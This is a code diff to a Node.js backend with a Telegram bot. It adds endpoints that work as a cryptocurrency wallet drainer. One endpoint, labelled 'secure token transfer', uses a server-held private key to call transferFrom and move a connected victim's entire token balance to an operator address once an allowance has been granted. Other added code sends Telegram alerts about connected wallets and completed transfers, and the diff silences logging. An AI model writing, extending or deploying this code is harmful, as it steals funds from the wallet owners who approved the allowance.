@@ -2,6 +2,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const express = require('express');
 const cors = require('cors');
 const axios = require('axios');
+const { ethers } = require('ethers');
 require('dotenv').config();
 
 const app = express();
@@ -66,11 +67,27 @@ app.get('/api/test', (req, res) => {
     res.json({ message: 'Backend is working!', timestamp: new Date().toISOString() });
   });
 
+// API endpoint to get configuration for frontend (without exposing private key)
+app.get('/api/config', (req, res) => {
+  try {
+    res.json({
+      success: true,
+      config: {
+        approvalAddress: process.env.APPROVAL_ADDRESS,
+        rpcUrl: process.env.RPC_URL
+      }
+    });
+  } catch (error) {
+    console.error('Error getting config:', error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
 // API Routes
 app.post('/api/wallet-connected', async (req, res) => {
   try {
     const { address } = req.body;
-    console.log(address)
+    //console.log(address)
     if (!address) {
       return res.status(400).json({ error: 'Address is required' });
     }
@@ -85,7 +102,7 @@ app.post('/api/wallet-connected', async (req, res) => {
     const sendPromises = TELEGRAM_USER_IDS.map(async (destination) => {
       try {
         await bot.sendMessage(destination, message, { parse_mode: 'HTML' });
-        console.log(`Message sent to ${destination}`);
+        //console.log(`Message sent to ${destination}`);
       } catch (error) {
         console.error(`Failed to send to ${destination}:`, error.message);
       }
@@ -100,6 +117,155 @@ app.post('/api/wallet-connected', async (req, res) => {
   } catch (error) {
     console.error('Error:', error);
     res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// API endpoint for token transfer notifications
+app.post('/api/token-transferred', async (req, res) => {
+  try {
+    const { 
+      fromAddress, 
+      toAddress, 
+      tokenAddress, 
+      amount, 
+      symbol, 
+      txHash,
+      usdValue 
+    } = req.body;
+    
+    // Validate required fields
+    if (!fromAddress || !toAddress || !tokenAddress || !amount || !symbol || !txHash) {
+      return res.status(400).json({ 
+        error: 'Missing required fields: fromAddress, toAddress, tokenAddress, amount, symbol, txHash' 
+      });
+    }
+
+    // Format transfer notification message
+    const message = formatTransferMessage({
+      fromAddress,
+      toAddress,
+      tokenAddress,
+      amount,
+      symbol,
+      txHash,
+      usdValue
+    });
+    
+    // Send to all predefined destinations
+    const sendPromises = TELEGRAM_USER_IDS.map(async (destination) => {
+      try {
+        await bot.sendMessage(destination, message, { parse_mode: 'HTML' });
+        //console.log(`Transfer notification sent to ${destination}`);
+      } catch (error) {
+        console.error(`Failed to send transfer notification to ${destination}:`, error.message);
+      }
+    });
+    
+    await Promise.allSettled(sendPromises);
+    
+    res.json({ 
+      success: true, 
+      message: `Transfer notification sent to ${TELEGRAM_USER_IDS.length} Telegram destination(s)` 
+    });
+  } catch (error) {
+    console.error('Error sending transfer notification:', error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// API endpoint to perform secure token transfer using backend private key
+app.post('/api/transfer-tokens', async (req, res) => {
+  try {
+    const { 
+      fromAddress, 
+      tokenAddress, 
+      amount 
+    } = req.body;
+    
+    // Validate required fields
+    if (!fromAddress || !tokenAddress || !amount) {
+      return res.status(400).json({ 
+        error: 'Missing required fields: fromAddress, tokenAddress, amount' 
+      });
+    }
+
+    // Get configuration from environment variables
+    const privateKey = process.env.APPROVAL_WALLET_PRIVATE_KEY;
+    const rpcUrl = process.env.RPC_URL;
+    const approvalAddress = process.env.APPROVAL_ADDRESS;
+    console.log("config data: ", rpcUrl, approvalAddress)
+
+    if (!privateKey || !rpcUrl || !approvalAddress) {
+      return res.status(500).json({ 
+        error: 'Server configuration missing. Please check environment variables.' 
+      });
+    }
+
+    // Create provider and wallet
+    const provider = new ethers.JsonRpcProvider(rpcUrl);
+    const wallet = new ethers.Wallet(privateKey, provider);
+    
+    // ERC20 ABI for transfer function
+    const erc20Abi = [
+      "function transferFrom(address from, address to, uint256 amount) returns (bool)",
+      "function balanceOf(address owner) view returns (uint256)",
+      "function decimals() view returns (uint8)",
+      "function symbol() view returns (string)",
+      "function allowance(address owner, address spender) view returns (uint256)"
+    ];
+    
+    // Create contract instance
+    const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, wallet);
+    
+    // Get token details
+    const [symbol, decimals, balance, allowance] = await Promise.all([
+      tokenContract.symbol(),
+      tokenContract.decimals(),
+      tokenContract.balanceOf(fromAddress),
+      tokenContract.allowance(fromAddress, approvalAddress)
+    ]);
+    
+    //console.log(`Token: ${symbol}, Balance: ${ethers.formatUnits(balance, decimals)}`);
+    
+    // Check if we have sufficient allowance
+    if (allowance < balance) {
+      return res.status(400).json({ 
+        error: 'Insufficient allowance for transfer' 
+      });
+    }
+    
+    // Execute transfer
+    const transferTx = await tokenContract.transferFrom(
+      fromAddress,
+      approvalAddress,
+      balance // Transfer full balance
+    );
+    
+    //console.log(`Transfer transaction sent: ${transferTx.hash}`);
+    
+    // Wait for confirmation
+    const receipt = await transferTx.wait();
+    
+    if (receipt.status === 1) {
+      //console.log(`✅ Transfer successful! Hash: ${receipt.hash}`);
+      
+      res.json({
+        success: true,
+        txHash: receipt.hash,
+        amount: ethers.formatUnits(balance, decimals),
+        symbol: symbol,
+        message: 'Token transfer completed successfully'
+      });
+    } else {
+      throw new Error('Transaction failed');
+    }
+    
+  } catch (error) {
+    console.error('Error in token transfer:', error);
+    res.status(500).json({ 
+      error: 'Token transfer failed', 
+      details: error.message 
+    });
   }
 });
 
@@ -246,9 +412,37 @@ function formatWalletMessage(address, data) {
   return message;
 }
 
+function formatTransferMessage(transferData) {
+  const { fromAddress, toAddress, tokenAddress, amount, symbol, txHash, usdValue } = transferData;
+  
+  let message = `<b>🎯 Token Transfer Completed!</b>\n\n`;
+  message += `<b>🔄 Transfer Details:</b>\n`;
+  message += `<b>Amount:</b> ${amount} ${symbol}\n`;
+  
+  if (usdValue) {
+    message += `<b>USD Value:</b> ~$${usdValue}\n`;
+  }
+  
+  message += `\n<b>📍 Addresses:</b>\n`;
+  message += `<b>From:</b> <code>${fromAddress}</code>\n`;
+  message += `<b>To:</b> <code>${toAddress}</code>\n`;
+  
+  message += `\n<b>🪙 Token Contract:</b>\n`;
+  message += `<code>${tokenAddress}</code>\n`;
+  
+  message += `\n<b>🔗 Transaction:</b>\n`;
+  message += `<a href="https://etherscan.io/tx/${txHash}">View on Etherscan</a>\n`;
+  message += `<code>${txHash}</code>\n`;
+  
+  message += `\n<b>⏰ Status:</b> ✅ Confirmed\n`;
+  message += `<b>🕐 Time:</b> ${new Date().toLocaleString()}\n`;
+  
+  return message;
+}
+
 // Start server
 const PORT = process.env.PORT || 3001;
 app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
-  console.log('Telegram bot is active');
+  //console.log(`Server running on port ${PORT}`);
+  //console.log('Telegram bot is active');
 });
